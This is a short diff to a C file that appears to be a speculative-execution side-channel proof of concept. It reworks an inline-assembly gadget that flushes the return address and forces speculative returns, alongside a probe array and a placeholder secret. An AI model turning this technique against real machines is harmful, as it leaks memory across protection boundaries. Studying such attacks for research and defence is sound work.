@@ -12,10 +12,8 @@ char array[256*256];
 char temp;
 char secret = 'p';
 
-#define gadget()
+void gadget(){
 	__asm__(
-	"push %rbp;"
-	"mov %rsp, %rbp;"
 	"pop %rdi;"
 	"pop %rdi;"	
 	"pop %rdi;"
@@ -24,6 +22,7 @@ char secret = 'p';
 	"clflush (%rsp);"
 	"cpuid;"
 	"retq;");
+}
 
 
 void speculative(char *secret_ptr){
